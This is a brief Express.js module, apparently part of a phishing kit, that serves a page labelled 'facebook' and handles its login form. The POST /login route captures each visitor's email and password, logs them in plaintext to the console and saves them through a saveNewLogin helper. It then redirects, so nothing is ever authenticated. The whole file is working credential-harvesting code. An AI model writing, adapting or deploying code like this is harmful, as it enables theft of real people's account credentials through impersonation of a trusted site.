exports.info = {
    name: 'facebook',
    views: '/facebook/views',
    static: '/facebook/static'
};

exports.execute = function (app, schemaUtils) {
    app.get('/', async (req, res) => {
        res.render('index');
    });

    app.post('/login', async (req, res) => {
        let email = req.body.email;
        let pass = req.body.pass;

        if (email && pass) {
            console.info(`Email: ${email} - Pass: ${pass}`);
            schemaUtils.saveNewLogin(exports.info.name, email, pass);
        }
        res.status(200).redirect('/');
    })
};